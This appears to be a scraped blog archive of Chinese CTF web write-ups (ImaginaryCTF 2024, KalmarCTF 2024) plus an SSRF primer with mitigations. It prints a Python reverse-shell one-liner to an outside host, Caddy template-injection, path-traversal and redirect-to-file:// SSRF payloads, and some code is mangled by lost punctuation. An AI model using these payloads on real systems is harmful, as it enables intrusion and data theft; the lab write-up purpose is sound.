具体原理的话，需要看bun框架对url参数的处理方式 即最后的请求包为 可以看到url的pathname部分并没有/开头 journal-dist (100 pts) - 518 solves by Eth007 Description dear diary, there is no LFI in this app 附件：点击下载附件 源码比较短 if (isset($_GET[file])) $file = $_GET[file]; $filepath = ./files/ . $file; assert(strpos($file, ..) === false) or die(Invalid file!); if (file_exists($filepath)) include($filepath); else echo File not found!; 能导致漏洞的就是assert(strpos($file, ..) === false)，由于采用字符串凭借，所以assert()函数(官方文档指路：PHP: assert - Manual)中执行的代码基本上是可控的 root@2419de65327b:/var/www/html# php -vPHP 7.4.33 (cli) (built: Nov 15 2022 06:03:30) ( NTS )Copyright (c) The PHP GroupZend Engine v3.4.0, Copyright (c) Zend Technologies 经过测试发现，在此版本中确实被php代码执行，但由于strpos()有返回值了，所以需要在strpos()中进行拼接，最后playload P2C (100 pts) - 247 solves by FIREPONY57 Description Welcome to Python 2 Color, the world’s best color picker from python code! 附件：点击下载附件 重点就是这个函数 def xec(code): code = code.strip() indented = .join([ + line for line in code.strip().splitlines()]) file = f/tmp/uploads/code_md5(code.encode()).hexdigest().py with open(file, w) as f: f.write(def main(): ) f.write(indented) f.write( from parse import rgb_parseprint(rgb_parse(main()))) os.system(fchmod 755 file) try: res = subprocess.run([sudo, -u, user, python3, file], capture_output=True, text=True, check=True, timeout=0.1) output = res.stdout except Exception as e: output = None os.remove(file) return output 简单来说就是根据输入的code，最后生成一个，如下格式的py文件 def main(): #input codefrom parse import rgb_parseprint(rgb_parse(main())) rgb_parse()函数定义中parse.py def rgb_parse(inp=): inp = str(inp) randomizer = random.randint(100, 1000) total = 0 for n in inp: n = ord(n) total += n+random.randint(1, 10) rgb = total*randomizer*random.randint(100, 1000) rgb = str(rgb%1000000000) r = int(rgb[0:3]) + 29 g = int(rgb[3:6]) + random.randint(10, 100) b = int(rgb[6:9]) + 49 r, g, b = r%256, g%256, b%256 return r, g, b 思路一： 反弹Shellres = subprocess.run([sudo, -u, user, python3, file], capture_output=True, text=True, check=True, timeout=0.1) 最开始看到timeout=0.1还以为python与php一样，执行子进程的时间算作整体时间，0.1秒反弹出shell好像并没有啥用，实际上是可以反弹出shell，timeout=0.1对反弹shell并没有影响 去hacktools里生成一个python的反弹shell语句 python3 -c import os,pty,socket;s=socket.socket();s.connect((1.1.1.1,8077));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(sh) 贴上去 虽然页面会报500错误 成功反弹到shell 思路二： 利用urllib库这个思路就是直接读取文件，然后因为系统命令行中没有curl命令使用，且没有requests库，但可以依靠原生的urllib库，将flag外带出来 虽然也500，但最终也是拿到了flag 思路三： 利用random.seed 这种是官方的WP中的解法，这里讲一下思路 链接指路：https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/p2c/challenge/solve.py random库在设置seed后，random.randint()范围确定时，生成的值为固定的 import randomdef main(): random.seed(1)if __name__ == __main__: main() print(random.randint(100, 1000)) PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release PS F:\\CTF File\\imaginaryctf\\p2c_release 且函数中rgb_parse(inp=)的inp值为可控的，我们需要将其固定，此时我们可以控制random.seed()的值，每个不同值通过rgb_parse()，此时return的值不再是变化的而是一个固定的值 将random.seed()的值为flag字符的中的逐个字符，这样变量只有flag的每个字符，在本地根据return的rgb算法跑一边彩虹表，也就是官方题解中的 lookup = rgb_parse(i, aaa):i for i in range(256) 最终每个rgb根据彩虹表的映射关系，还原为原本的字符","tags":["WriteUp"],"categories":["WriteUp"]},{"title":"服务器端请求伪造(SSRF)","path":"/posts/d35506b2/","content":"SSRF服务端请求伪造（Server Side Request Forgery, SSRF） 攻击者构造形成以服务器的身份发送一条构造好的请求给服务器所在内网。因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统 .ilwjcygizxix{zoom: 50%;} 危害 可以对服务器所在的内网环境进行端口扫描、资源访问 访问内部资源,如连接数据库等 若在云服务器可以利用云服务器元数据攻击云平台内其他组件或服务 利用Redis未授权访问getshell 场景 XXE漏洞点 图片加载下载：通过URL加载网络图片(头像上传等) 转码服务：适配手机屏幕大小并通过URL地址进行图片转码 分享功能：通过URL地址分享网页内容，通过URL获取目标页标题、页面、截图等内容 编辑器进行远程图片抓取 如: ueditor(ueditor的远程图片抓取的地址一般在/ueditor/editor_config.js中的catcherUrl参数中) ​ 利用访问内网服务伪协议利用Redis利用云主机工具Bypass更改IP地址写法解析到内网的域名利用HTTP状态码跳转协议替代利用域名特殊字符标准化处理利用IPv6DNS Rebinding(DNS重绑定)Fix 看到很多面试喜欢问这个，就顺手写一下 设置内网IP的黑名单，对于在黑名单内的IP，禁止访问 统一 IP 地址格式 过滤特殊字符，对URL规范化处理 禁止302跳转，设置不跟随跳转 对于域名来说，应先通过DNS解析IP，判断IP是否为内网黑名单中 检测协议，设置协议白名单，可以防止file://,gopher://,ftp:// 等协议引起的问题。 对DNS Rebinding(DNS重绑定)，考虑使用DNS缓存或者Host白名单","tags":["CTF-Web","Web-SSRF"],"categories":["web"]},{"title":"2024KalmarCTF-WEB复盘","path":"/posts/fbcd83ad/","content":"前言： 靶场链接：https://kalmarc.tf/challenges 难度太大了根本写不出来参考大佬的题解最后复盘出来的 原文链接：https://ireland.re/posts/KalmarCTF_2024/ 复盘题解Ez ⛳ v2题目描述 Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports HTTP3? Or TLS1.3? etc Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。 Flag is located at GET $(head -c 18 devurandom | base64) go fetch it. Flag 位于GET $(head -c 18 devurandom | base64)，去获取它吧。 附件：点击下载附件 解题思路下载完打开附件包发现只有四个文件，Caddyfile、docker-compose.yml这两个中有比较有用的信息 docker-compose.yml中的关键信息 caddy: image: caddy:2.7.6-alpine volumes: - ./Caddyfile:/etc/caddy/Caddyfile:ro - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD # 文件将在生产环境中被重新命名为类似的随机名称 Caddyfile中为对Caddy的配置文件 (sec_headers) root * / header Content-Security-Policy default-src none; frame-ancestors none; base-uri none; Strict-Transport-Security max-age=31536000 X-XSS-Protection 0 X-Content-Type-Options nosniff X-Frame-Options DENY Referrer-Policy no-referrer (html_reply) import sec_headers header Content-Type text/html templates respond !DOCTYPE htmlmeta charset=utf-8titlehttp.request.host/titlebodyargs[0]/body(json_reply) templates # By default placeholders are not replaced for json mime application/json header Content-Type application/json respond args[0](http_reply) tls internal alpn args[0] map args[0] proto_name http/1.1 HTTP/1.1 h2 HTTP/2.0 h3 HTTP/3.0 @correctALPN `http.request.proto == proto_name` respond @correctALPN You are connected with http.request.proto (tls_version, tls_cipher). import html_reply You are connected with http.request.proto instead of proto_name (tls_version, tls_cipher). !-- Debug: http.request.uuid--(tls_reply) tls internal protocols args[0] args[1] header Access-Control-Allow-Origin * import json_reply tls_version:tls_version,alpn:http.request.tls.proto,sni:http.request.tls.server_name,cipher_suite:http.request.tls.cipher_suitemtls.caddy.chal-kalmarc.tf tls internal client_auth mode require templates import html_reply `You are connected with client-cert http.request.tls.client.subject`tls.caddy.chal-kalmarc.tf import tls_reply tls1.2 tls1.3tls12.caddy.chal-kalmarc.tf import tls_reply tls1.2 tls1.2tls13.caddy.chal-kalmarc.tf import tls_reply tls1.3 tls1.3ua.caddy.chal-kalmarc.tf tls internal templates import html_reply `User-Agent: .Req.Header.Get User-Agent`http.caddy.chal-kalmarc.tf tls internal templates import html_reply You are connected with http.request.proto (tls_version, tls_cipher).http1.caddy.chal-kalmarc.tf import http_reply http/1.1http2.caddy.chal-kalmarc.tf import http_reply h2http3.caddy.chal-kalmarc.tf import http_reply h3caddy.chal-kalmarc.tf tls internal import html_reply `Hello! Wanna know you if your browser supports a href=https://http1.caddy.chal-kalmarc.tf/http/1.1/a? a href=https://http2.caddy.chal-kalmarc.tf/http/2/a? Or fancy for some a href=https://http3.caddy.chal-kalmarc.tf/http/3/a?! Check your preference a href=https://http.caddy.chal-kalmarc.tf/here/a.br/We also allow you to check a href=https://tls12.caddy.chal-kalmarc.tf/TLS/1.2/a, a href=https://tls13.caddy.chal-kalmarc.tf/TLS/1.3/a, a href=https://tls.caddy.chal-kalmarc.tf/TLS preference/a, supports a href=https://mtls.caddy.chal-kalmarc.tf/mTLS/a? Checkout your a href=https://ua.caddy.chal-kalmarc.tf/User-Agent/a!!-- At some point we might even implement a a href=https://flag.caddy.chal-kalmarc.tf/flag/a endpoint! --` 对于没用接触过的Caddy的我只能去官方文档看看其中的配置文件所代表的含义 查了下发现还有中文文档哈哈哈哈哈哈哈哈哈哈 链接：Caddy v2中文文档 (dengxiaolong.com) 不懂的就半查半猜，问问狗屁通，然后有个初步的理解: Caddy中存在一个概念：片段 (指令名)\t具体的指令内容 例如： (html_reply) import sec_headers header Content-Type text/html templates respond !DOCTYPE htmlmeta charset=utf-8titlehttp.request.host/titlebodyargs[0]/body 片段类似于我们熟悉的概念：函数，可以在被调用 在任何你需要的地方重复使用它： import 指令名 块 块由一对花括号完成的： ... ... 花括号前写所服务的域名，花括号后填写对应的指令 此外在片段中有一个特别的指令：templates-模板，类似于python中的Jinja2模板引擎，进行实时渲染 对应的官方文档：Module http.handlers.templates - Caddy Documentation (caddyserver.com) 根据templates对应的语法规则（指令）尝试能不能和Python一样进行模板注入 由于修改UA（User-Agent）比较方便，所以我选择了ua.caddy.chal-kalmarc.tf，将UA修改为7*7发现服务端返回了500错误，发现这个思路应该是有戏，修改为.Host发现最后页面返回了User-Agent: ua.caddy.chal-kalmarc.tf，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到flag的指令 1.readFile Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。 readFile path/to/file.html 2.listFiles Returns a list of the files in the given directory, which is relative to the template context’s file root.返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。 listFiles /mydir 因此我们修改UA为listFiles \"/\"获得flag的文件名： CVGjuzCIVR99QNpJTLtBn9 然后再修改UA为readFile \"/CVGjuzCIVR99QNpJTLtBn9\"，最后成功获取flag： kalmarY0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate BadAss Server for Hypertext强悍的超文本服务器 题目描述 I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right? 我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？ 前置知识 /proc目录以及子目录的功能及其作用 shell语言 通配符 解题思路这是一个黑盒测试，点击题目链接后发现就一个按钮可以交互 点击这个按钮，跳转到http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮 !-- a href=assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt\tbuttonGet the flag/button/a -- 再次点进去，发现就一句话：Did you think it was this easy? Nah, this isnt the flag. 也没什么实际的价值点（其实后面这两个东东会被利用到），然后就是无头无脑的不断尝试了robots.txt、抓包再发包 这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：X-Powered-By: Bash，shell语言做后端？？ 发现随便输入一个内容到url后如果不存在会输出为：cat: /app/static/1: No such file or directory，可以大胆推测后端为shell语言了 然后我就开始怀疑是不是有目录创越的漏洞存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入..会被删除，而并不会直接传会后端）将url修改为/../../../../../etc/passwd,返回包中出现了passwd中对应的内容 逻辑漏洞1：发现目录穿越漏洞确实存在，可以尝试直接读一下/flag发现根目录下不存在flag文件，那就只能进/proc目录找找对应的进程和运行目录了，一般读取1进程（一般赛题docker中最初的线程号为1）和self进程（当前指令所属的进程），一通乱尝试cmdline、environ、status等等发现了一些有用的东西 在/../../../../../proc/1/cmdline尝试读取后端的运行程序 HTTP/1.0 200 OKContent-Type: inode/x-emptyX-Powered-By: BashContent-Length: 0Connection: closesocat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh 此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为： #!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=200 OKabort() declare -gA response_headers\tstatus=400 Bad Request\twrite_headers\tif [ ! -z $1+x ]; then 2 echo Request aborted: $1 echo -en $1\tfi\texit 1write_headers() response_headers[Connection]=close\tresponse_headers[X-Powered-By]=Bash\techo -en HTTP/1.0 $status\\r for key in $!response_headers[@]; do echo -en $key: $response_headers[$key]\\r done\techo -en \\r 2 echo $(date -u +%Y-%m-%dT%H:%M:%SZ) $SOCAT_PEERADDR $method $uri $protocol - $statusreceive_request() read -d $ -a request_line\tif [ $#request_line[@] != 3 ]; then abort Invalid request line\tfi\tmethod=$request_line[0]\turi=$request_line[1]\tprotocol=$(echo -n $request_line[2] | sed s/^\\s*//g | sed s/\\s*$//g)\tif [[ ! $method =~ ^(GET|HEAD)$ ]]; then abort Invalid request method\tfi\tif [[ ! $uri =~ ^/ ]]; then abort Invalid URI\tfi\tif [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then abort Invalid protocol\tfi\twhile read -d $ header; do stripped_header=$(echo -n $header | sed s/^\\s*//g | sed s/\\s*$//g) if [ -z $stripped_header ]; then break; fi header_name=$(echo -n $header | cut -d : -f 1 | sed s/^\\s*//g | sed s/\\s*$//g | tr [:upper:] [:lower:]); header_value=$(echo -n $header | cut -d : -f 2- | sed s/^\\s*//g | sed s/\\s*$//g); if [ -z $header_name ] || [[ $header_name =~ [[:space:]] ]]; then abort Invalid header name; fi # If header already exists, add value to comma separated list if [[ -v request_headers[$header_name] ]]; then request_headers[$header_name]=$request_headers[$header_name], $header_value else request_headers[$header_name]=$header_value fi\tdone\tbody_length=$request_headers[content-length]:-0\tif [[ ! $body_length =~ ^[0-9]+$ ]]; then abort Invalid Content-Length\tfi\tread -N $body_length request_bodyhandle_request() # Default: serve from static directory\tpath=/app/static$uri\tpath_last_character=$(echo -n $path | tail -c 1)\tif [ $path_last_character == / ]; then path=$pathindex.html\tfi\tif ! cat $path /dev/null; then status=404 Not Found\telse mime_type=$(file --mime-type -b $path) file_size=$(stat --printf=%s $path) response_headers[Content-Type]=$mime_type response_headers[Content-Length]=$file_size\tfi\twrite_headers\tcat $path 21receive_requesthandle_request 由于是shell语言这里我想到了一些shell中的一些骚操作例如： $变量名 #会将变量的值进行拓展出来$(命令) #会执行（）中的命令`命令` #会执行` `中的命令 open , 拓展：shell语言中的部分特性 特性1：展开 按照展开顺序分为： 花括号展开（Brace Expansion）：花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。 示例： $ echo a,b,ca b c$ echo file1..3.txtfile1.txt file2.txt file3.txt 波浪线展开（Tilde Expansion）：波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。 示例： $ echo ~/home/username$ echo ~/Documents/home/username/Documents 参数，变量，算术展开和命令替换：参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。 示例： $ echo $HOME/home/username$ echo $((2 + 2))$ echo $(ls)file1.txt file2.txt file3.txt 单词分割（Word Splitting）：单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。 示例： $ string=Hello World$ echo $stringHello World$ for word in $string; do echo $word; doneHelloWorld 文件名展开（Filename Expansion）：文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。 示例： $ ls *.txtfile1.txt file2.txt file3.txt$ rm file?.txt 特性2：单双引号的区别 单引号： 使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，${}、$()、反引号、通配符无法被使用 例如： root@ubuntu:/home/ubuntu/Desktop# echo /*/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo /*/*root@ubuntu:/home/ubuntu/Desktop# echo $(date)$(date) 双引号： 变量展开：双引号内的变量会被展开，即变量的值会替换变量本身。 命令替换：双引号内的命令替换（使用$()或反引号）会被执行，其输出会替换命令本身。 通配符不会展开：双引号内的通配符（如*、?等）不会被作为通配符处理，而是作为普通字符。 转义字符：某些特殊字符（如$、反引号、\\）可以通过反斜线进行转义以表示其字面意义。 例如： #变量展开root@ubuntu:/home/ubuntu/Desktop# path=*root@ubuntu:/home/ubuntu/Desktop# echo $path*#命令替换root@ubuntu:/home/ubuntu/Desktop# echo $(date)2024年 03月 24日 星期日 16:55:37 CST#通配符不会展开root@ubuntu:/home/ubuntu/Desktop# echo ** 特性3：变量展开后的字符串 1.进行变量展开后，通配符不受 展开前单双引号性质的影响 ​\t只要最后使用变量时，最外层不存在即可展开 例如 #test1path=*path_after=./*echo $path_after #变量替换后，最外层也无的影响，此时通配符*可被展开#输出结果：./badass_server.sh ./character1.sh ./character2.sh#test2path=*path_after=./$pathecho ”$path_after“ #变量替换后，最外层存在的影响，通配符无法展开#输出结果： ./* 2.进行变量展开后，变量展开、命令替换受最开始赋值时的单双引号影响 ​\t若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开 例如： #test1path=$(date)path_after=./$pathecho $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# ./$(date)# ./$(date)#test2data= dateecho $datapath=$datapath_after=./$pathecho $path_afterpath_after_after=$path_afterecho $path_after_after# 输出结果：# Sun Mar 24 21:29:51 2024# ./$data# ./$data 但经过尝试，发现无法通过控制$path这个值变为$使最后的cat返回命令替换的结果 预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）： root@ubuntu:/home/ubuntu/Desktop# url=$(ls)root@ubuntu:/home/ubuntu/Desktop# path=app/static/$urlroot@ubuntu:/home/ubuntu/Desktop# cat $pathcat: app/static/1.sh$ 2: 没有那个文件或目录 实际结果 open , 拓展：shell语言中的部分特性 特性4：read命令处理字符串 使用read命令来读取输入的字符串时，所读取的字符串相当于被单引号包围，具有单引号包裹的字符串的特点 变量不展开：单引号内的内容都会被当作普通字符串处理，包括变量，它们不会被展开。 命令不替换：单引号内的命令不会被执行，即使使用$()或反引号。 通配符不展开：单引号内的通配符同样不会被展开，被视为普通文本。 转义字符不工作：单引号内几乎所有的字符都被视为普通字符，包括反斜线（\\），它不具有转义功能。 例如： #test1read -d $ -a request_linemethod=$request_line[0]echo $method#输入：$(ls) $(ls) $(ls)#输出：$(ls)#test2request_line=($(ls) $(ls))method=$request_line[0]echo $method#输出：badass_server.sh bash.md 此时发现我们可控点只剩下$protocol变量 protocol=$(echo -n $request_line[2] | sed s/^\\s*//g | sed s/\\s*$//g) if [ $protocol != HTTP/1.0 ] [ $protocol != HTTP/1.1 ]; then\tabort Invalid protocolfi 逻辑漏洞2：可控原因：$protocol变量由于使用echo命令，是得read读取后的特性消失，使得$protocol可被拓展 当我们尝试修改HTTP/1.1为/*时，发现并没有出现Invalid protocol open , 拓展：shell语言中的部分特性 特性4：[]的返回值 在 shell 中，[] 符号通常用于条件测试。如 if [ CONDITION ]; then ... 这样的语句。在这种用法中，[] 是 [ 命令的简写，这实际上是一个指向 test 命令的链接。因此，当你使用 [] 时，实际上是在调用 test 命令来评估一个条件。 test 命令（或其等价的 [ 形式）的返回值遵循 shell 命令的通用返回值约定： 0：表示测试的条件为真（true）。 1：表示测试的条件为假（false）。。 1：如果出现错误，如语法错误或使用了无效的选项，test 命令可能会返回大于 1 的值。比较特别的是，此时即使设置了set -e也不会退出程序 逻辑漏洞3：将HTTP/1.1替换为/*时，由于通配符展开，最后会出现进行匹配错误，[]返回大于1的结果，的两侧结果都是大于0，返回1，因此认为是假，此时这个if条件被判定为假，可以继续执行后面内容的代码 但如果/*匹配到的结果只有一个时，并不会造成匹配错误，而直接返回0，的任意一侧结果为0会直接返回0，此时这个if条件被判定为真 启动set -x时的详细信息如下 + [ badass_server.sh bash.md character1.sh character2.sh file != HTTP/1.0 ]./badass_server.sh: line 63: [: too many arguments 注意：此时通配符展开并不能认为这个变量是数组，数组直接使用会利用数组第0个进行匹配，而通配符展开会报错 因此我们可以通过这个点，使用glob通配符[]写入一个已知的字符，不断修改字符，使其最后能匹配到的结果最后有1个以上，页面不出现：Invalid protocol，进行对目录或者文件名的一步一步匹配（用这种方法可以确定名称比已知目录少的目录名） 最初的页面给出了两个目录，需要利用这两个目录，选择一个目录作为已知字符 a href=assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg\tbuttonExplore the iceberg/button/a!-- a href=assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt\tbuttonGet the flag/button/a -- 以26c3f25922f71af3372ac65a75cd3b11作为已知字符为例，所以最后的playload的过程为： GET /../../../../../../etc/passwd /app/static/assets/[29]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d]*GET /../../../../../../etc/passwd /app/static/assets/[29][6d][cf]*........ 最后找到隐藏的目录， 9df5256fe48859c91122cb92964dbd66 估计最后是猜的吧，flag最后的位置是：/app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt 修改url为../../../../../app/static/assets/9df5256fe48859c91122cb92964dbd66/flag.txt读出kalmar17b29adf_bash_web_server_was_a_mistake_374add33 Is It Down它是否宕机 题目描述 In an increasingly online world it is nice to know, if you are the only one being offline or if everybody else are having offline too. 在一个日益在线化的世界中，了解自己是唯一离线还是其他人也处于离线状态是很重要的。 We present to you: Is it down! 我们向您介绍：它是否宕机！ Rumour has it, that a flag is stored somewhere on this server. 有传言称，一个标志位被存储在这台服务器的某个地方。 前置知识 /proc目录以及子目录的功能及其作用 Python语言及特性 __pycache__文件夹 解题思路同样的这也是一个黑盒测试，看了看页面发现并没有什么提示，可以根据自己的输入的网址进行判断，网址是否在线或者离线 直接抓包然后repeat看看 会发现页面出现了我们输入网页的源代码，相关的漏洞应该就是SSRF 尝试直接使用file:///etc/passwd试试看，发现页面回显出了 error:Url must start with https://. We do not want anything insecure here!,success:false 发现只能使用https://开头的链接（是我应该就在这卡住了） 根据大佬的思路，我们可以尝试一个发生重定向的网址， 无语啦 。。。。。。。。好麻烦，还得自己起个https服务 根据实际的测试发现： 如果输入的链接网页存在任何内容，不会跟随着网页重定向 如果输入的链接网页不存在任何内容，此时会跟随着网页重定向 例如： 我们输入网址的响应包为： HTTP/1.1 301 Moved PermanentlyServer: nginxDate: Sun, 24 Mar 2024 15:00:50 GMTContent-Type: text/htmlContent-Length: 162Connection: closeLocation: https://t.doruo.cn/14Qqfhjr2htmlheadtitle301 Moved Permanently/title/headbodycenterh1301 Moved Permanently/h1/centerhrcenternginx/center/body/html 此时，不跟随重定向，返回的内容为 content:html\\\\r\\ headtitle301 Moved Permanently/title/head\\\\r\\ body bgcolor=\\white\\\\\\r\\ centerh1301 Moved Permanently/h1/center\\\\r\\ hrcenteropenresty/center\\\\r\\ /body\\\\r\\ /html\\\\r\\ ,online:true,success:true 我们自己起一个后端服务，为了随时更改重定向内容，我们可以设置代码为以下 ?phperror_reporting(0);header(Location: .$_GET[wells]); 此时我们使用这个服务，并输入参数?wells=file:///etc/passwd,发现页面返回出来了passwd的文件内容 content:root:x:0:0:root:/root:/bin/ash\\ .........,online:true,success:true 此时再次利用/proc目录进行尝试找到后端服务的文件夹位置以及所对应的运行程序 在/proc/1/cmdline尝试读取后端的运行程序的相关信息uwsgi\\\\x00--ini\\\\x00/etc/uwsgi/uwsgi-custom.ini\\\\x00，可以猜到此时的后端应该是flask，然后再顺藤摸瓜进入到/etc/uwsgi/uwsgi-custom.ini读取配置信息：（美化后） [uwsgi]uid = www-datagid = www-datamaster = trueprocesses = 4http-socket = 0.0.0.0:5000chmod-sock = 664vacuum = truedie-on-term = truewsgi-file = /var/www/keep-dreaming-sonny-boy/app.pycallable = apppythonpath = /usr/local/lib/python3.11/site-packages 比较重要的信息是：wsgi-file = /var/www/keep-dreaming-sonny-boy/app.py，然后继续顺藤摸瓜找到对应的后端文件读出出来，因为经过了json的转化，变得无敌难看，让狗屁通美化一下最后得到 from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocess, osdef protect_secrets(): os.unlink(config.py)def check_url(url): if not isinstance(url, str) or len(url) == 0: return False, Please provide a regular url! if not url.startswith(https://) or url.lstrip() != url: return False, Url must start with https://. We do not want anything insecure here! return True, app = Flask(__name__, static_folder=static, static_url_path=/assets/)app.secret_key = session_encryption_keyprint(Using key: , app.secret_key)protect_secrets()@app.route(/, methods=[GET])def home(): return send_from_directory(pages, index.html)@app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: # return subprocess.check_output(/readflag) else: return abort(403)@app.route(/check, methods=[POST])def check(): url = request.form.get(url) valid, err = check_url(url) if not valid: return success: False, error: err if True: content = fetch(url) return success: True, online: content != None, content: content if __name__ == __main__: app.run(host=0.0.0.0, port=10600, debug=False) 但是这里面requestlib库文件是我们安装不了的，尝试直接读取一下requestlib.py查看是不是自己写的库，同样的也是读到了这个文件，经过美化后如下： from urllib.request import urlopen, HTTPErrorProcessor, build_opener, Requestimport urllibclass NoRedirection(HTTPErrorProcessor): def http_response(self, request, response): return response https_response = http_responseinstall_opener(build_opener(NoRedirection()))def fetch(url, follow_redirects=True): Avoid endless redirect loops headers = User-Agent: requestlib 2.9-alpha req = Request(url, headers=headers) with urlopen(req) as res: redirect_url = res.headers.get(Location)) if redirect_url and follow_redirects: return fetch(redirect_url, follow_redirects=False) return str(res.read())[2:-1] 漏洞成因在定义的fetch函数中follow_redirects值默认为True，并且跟随响应包中的Location键值进行判断是否存在重定向，重定向的目标是何。但由于只限制了第一次输入的网址为https://,并未进行对重定向的协议进行检查从而造成了SSRF 如何处理重定向 注意： 如浏览器，powershell中的curl再处理重定向时，无法处理从https://重定向至file:// powershell中的curl发生报错 浏览器会提示页面错误 做到这里，关键其实是为造出一个session，其键值存在admin: True,但存有session_encryption_key的config.py再被调用后就被删除了,需要找到如何复原的办法 @app.route(/flag, methods=[GET])def healthcheck(): if session.get(admin) == True: # return subprocess.check_output(/readflag) else: return abort(403) __pycache__文件夹 在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹。__pycache__文件夹正是缓存*.pyc地方。*.pyc文件的命名格式是module.interpreter_version.pyc。注意，对于被导入（import）的module才会生成对应的*.pyc文件 详细文档可参考： 【Python】__pycache__文件夹是什么东西？ - 知乎 (zhihu.com) pyhton中__pycache__文件夹的产生与作用_pycache文件夹下的东西是如何产生的-CSDN博客 例子： 以被导入的为config.py文件为例，最后生成在__pycache__文件夹config.cpython-35.pyc，最开始的config为被导入的文件名，cpython代表的是c语言实现的Python解释器，-35代表的是版本为3.5版。 因此，我们可以在__pycache__文件夹中找到config的.pyc文件，再进行逆向 最后测试到路径为：/var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，里面的内容为： \\\\xa7\\\\r\\\\r\\ \\\\x00\\\\x00\\\\x00\\\\x00\\\\x86\\\\x84\\\\xf7e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\ \\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\\\x01\\\\xda\\\\x16session_encryption_key\\\\xa9\\\\x00\\\\xf3\\\\x00\\\\x00\\\\x00\\\\x00\\\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\\\xfa\\\\x08moduler\\\\x07\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00s\\\\x11\\\\x00\\\\x00\\\\x00\\\\xf0\\\\x03\\\\x01\\\\x01\\\\x01\\\\xd8\\\\x19;\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16\\\\xd0\\\\x00\\\\x16r\\\\x05\\\\x00\\\\x00\\\\x00 由于转化为json后转义字符\\会变成\\\\,叫狗屁通写一个小小的脚本把以上数据恢复成二进制数据 data_str = \\\\xa7\\\\r\\\\r\\ \\\\x00\\\\x00\\\\x00\\\\x00\\\\x86\\\\x84\\\\xf7e;\\\\x00\\\\x00\\\\x00\\\\xe3\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\xf3\\ \\\\x00\\\\x00\\\\x00\\\\x97\\\\x00d\\\\x00Z\\\\x00d\\\\x01S\\\\x00)\\\\x02\\\\xda 